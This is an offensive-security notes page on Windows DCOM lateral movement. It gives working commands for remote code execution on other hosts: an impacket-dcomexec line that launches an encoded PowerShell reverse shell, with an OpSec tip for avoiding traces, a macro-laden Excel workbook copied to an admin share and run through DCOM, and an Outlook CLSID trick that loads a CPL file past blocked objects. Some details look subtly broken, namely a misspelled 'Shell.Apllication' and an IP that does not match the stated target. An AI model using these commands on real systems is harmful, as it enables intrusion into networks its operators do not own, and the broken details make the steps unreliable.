---
title: DCOM Lateral Movement
---

[[notes/lateral-movement/index]] over [[notes/network/dcom]].

Execute a reverse shell.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-dcomexec -k -no-pass -nooutput srv01.corp.com "powershell.exe -ep bypass -e $(iconv -t utf16le ./shell.ps1 | base64 -w0)"
    ~~~

    **OpSec:**
    The command output is written to a file and downloaded over SMB.
    This can be avoided by specifying `-nooutput`.

Untested tools:

- [CheeseDcom](https://github.com/klezVirus/CheeseTools#cheesedcom), implements many different methods in C#

References:

- [Windows Lateral Movement Part 2 – DCOM](http://web.archive.org/web/20230322175432/https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-2-dcom/), using `ExecuteExcel4Macro` or `RegisterXLL`
- [Lateral movement using Internet Explorer DCOM object and StdRegProv](http://web.archive.org/web/20230224075848/https://scribe.rip/@VakninHai/lateral-movement-using-internet-explorer-dcom-object-and-stdregprov-4f11362650e5)
- [Lateral movement using DCOM objects and C#](http://web.archive.org/web/20230101172433/https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/)
- [Unorthodox lateral movement: Stepping away from standard tradecraft](./unorthodox-lateral-movement.pdf), page 31 ff.

# Excel.Application

Check target `192.168.12.13`.

~~~ powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId('Excel.Application', '192.168.12.13'))
$com | Get-Member
~~~

Create new Excel document.
Select `View/Macros`, give the macro the name `mymacro` and insert the following VBA payload.

~~~ vba
Sub mymacro()
  shell("calc.exe")
End Sub
~~~

Then save the excel sheet in the old `*.xls` format.

Copy the document.

~~~ powershell
cp ./evil.xls \\192.168.12.13\c$\evil.xls
~~~

When Excel is started trough DCOM it runs in system context and complains about missing folders in its home directory.

~~~ powershell
mkdir \\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop
~~~

Run the macro.

~~~ powershell
$workbook = $com.Workbooks.Open('C:\evil.xls')
$workbook.Run('mymacro')
~~~

# Outlook.Application + CPL file

Remote access to some DCOM objects is blocked.
`Outlook.Application` can be used as a proxy to bypass this restriction.

Load CPL file via DCOM.

~~~ powershell
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("0006F033-0000-0000-C000-000000000046", "ws01.corp.com"))
$b = $a.CreateObject("Shell.Apllication")
$b.ControlPanelItem("%TEMP%\windefend.cpl")
~~~

References:

- [TROOPERS22: Unorthodox Lateral Movement: Stepping Away from the Standard Tradecraft](https://www.youtube.com/watch?v=z3kUwvunBIo)
